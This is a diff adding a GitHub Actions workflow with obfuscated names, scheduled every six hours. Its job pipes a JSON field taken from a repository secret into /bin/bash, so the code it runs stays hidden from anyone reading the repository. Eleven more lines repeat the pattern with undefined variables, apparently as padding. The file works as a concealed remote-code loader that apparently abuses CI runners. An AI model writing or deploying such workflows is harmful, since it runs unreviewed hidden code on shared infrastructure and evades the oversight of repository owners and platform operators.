@@ -1,0 +1,28 @@
+name: longjiudisncengshifoufangzaidisanjj
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: longjiudisncengshifoufangzaidisanjj
+        env:
+          jicn57362: ${{ secrets.jicn57362 }}
+        run: |
+          echo $jicn57362 | jq -r .auyea4000 | /bin/bash
+          echo $j6 | jq -r .t05 | /bin/bash
+          echo $abg3123 | jq -r .aao987 | /bin/bash
+          echo $kxb641 | jq -r .uq8653 | /bin/bash
+          echo $jv57 | jq -r .cr608 | /bin/bash
+          echo $h5 | jq -r .jrnr45 | /bin/bash
+          echo $lzjtu58718 | jq -r .lbpg35 | /bin/bash
+          echo $lgbr033 | jq -r .zg8294 | /bin/bash
+          echo $sjzlp89 | jq -r .ebqrs47 | /bin/bash
+          echo $uq2 | jq -r .u7 | /bin/bash
+          echo $ng00378 | jq -r .dxw7 | /bin/bash
+          echo $iid38739 | jq -r .irsjl6 | /bin/bash
+
